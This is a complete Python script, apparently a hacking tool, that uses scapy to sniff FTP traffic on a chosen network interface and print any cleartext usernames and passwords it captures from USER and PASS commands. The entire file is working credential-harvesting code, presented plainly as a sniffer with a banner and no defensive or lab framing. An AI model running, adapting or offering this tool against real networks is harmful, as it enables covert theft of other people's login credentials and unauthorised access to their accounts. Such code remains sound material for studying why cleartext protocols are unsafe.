#!/usr/bin/python3.8
from scapy.all import *
import argparse
from termcolor import colored
import pyfiglet

def get_argument():
    parser = argparse.ArgumentParser(description='Ftp sniffer')
    parser.add_argument('-i', '--iface', dest='iface', help='./ftpsniffer [-i] or [--iface]')
    args = parser.parse_args()
    if not args.iface:
        print('[{}] {}'.format(colored('-', 'red'), colored('Please specify an Interface To use.', 'red')))
    return args

def packet_parser(packet):
    keywords = ['USER', 'PASS']
    if packet[TCP].dport == 21:
        try:
            global load
            load = packet[Raw].load
            for keyword in keywords:
                if keyword in load.decode():
                    parse_result = check_keyword(keyword)
                    print(parse_result)

        except Exception:
            pass

def check_keyword(keyword):
    global load
    if keyword == 'USER':
        user = load.decode().strip('\n')
        return '[{}] Possible Username: {}'.format(colored('+', 'cyan', attrs=['bold']),
                                                  colored(user[4:], 'cyan', attrs=['bold']))
    elif keyword == 'PASS':
        pw = load.decode().strip('\n')
        return '[{}] Possible Password: {}'.format(colored('+', 'cyan', attrs=['bold']),
                                                  colored(pw[4:], 'cyan', attrs=['bold']))


def sniif(interface):
    sniff(filter='tcp port 21', iface=interface, prn=packet_parser)

def main():
    ascii_banner = pyfiglet.figlet_format('Ftp Sniffer')
    print(colored(ascii_banner, 'cyan', attrs=['bold']))
    print('-' * 70)
    print('[{}] {}'.format(colored('+', 'cyan'), 'FTP sniffer is Running.....'))
    print('-' * 70)
    args = get_argument()
    interface = args.iface
    try:
        sniif(interface)
    except KeyboardInterrupt:
        print('[{}] {}'.format(colored('+', 'cyan', attrs=['bold']), colored('Good Bye!', 'cyan', attrs=['bold'])))

if __name__ == '__main__':
    main()
